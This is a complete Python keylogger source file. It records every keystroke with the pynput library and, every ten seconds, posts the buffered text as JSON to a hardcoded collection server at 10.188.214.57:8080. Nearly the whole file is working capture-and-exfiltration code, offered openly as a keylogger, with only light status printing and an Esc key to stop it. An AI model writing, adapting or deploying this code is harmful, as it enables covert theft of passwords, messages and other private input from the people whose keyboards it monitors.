# keylogger.py
# pip install pynput requests

from pynput import keyboard
import requests
import json
import threading

# ----------------------------
# Global variables & settings
# ----------------------------
text = ""  # buffer for keystrokes

# Use the IP of the machine where server.py is running
ip_address = " 10.188.214.57"   # <- Change this if needed
port_number = "8080"

time_interval = 10  # send logs every 10 seconds


# ----------------------------
# Function to send POST request
# ----------------------------
def send_post_req():
    global text
    try:
        if text:
            payload = {"keyboardData": text}

            r = requests.post(
                f"http://{ip_address}:{port_number}/",
                json=payload   # ✅ simpler than json.dumps + headers
            )

            print(f"[+] Data sent: {r.status_code}, {r.text}")
            text = ""  # clear buffer

    except Exception as e:
        print(f"[!] Error sending request: {str(e)}")

    # Reschedule
    timer = threading.Timer(time_interval, send_post_req)
    timer.start()


# ----------------------------
# Key press handler
# ----------------------------
def on_press(key):
    global text
    try:
        if key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.backspace:
            text = text[:-1]
        elif key == keyboard.Key.esc:
            print("[*] Exiting keylogger.")
            return False
        else:
            text += str(key).replace("'", "")
    except Exception as e:
        print(f"[!] Error processing key: {str(e)}")


# ----------------------------
# Main
# ----------------------------
if __name__ == "__main__":
    print("[*] Keylogger started. Press 'Esc' to stop.")
    timer = threading.Timer(time_interval, send_post_req)
    timer.start()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
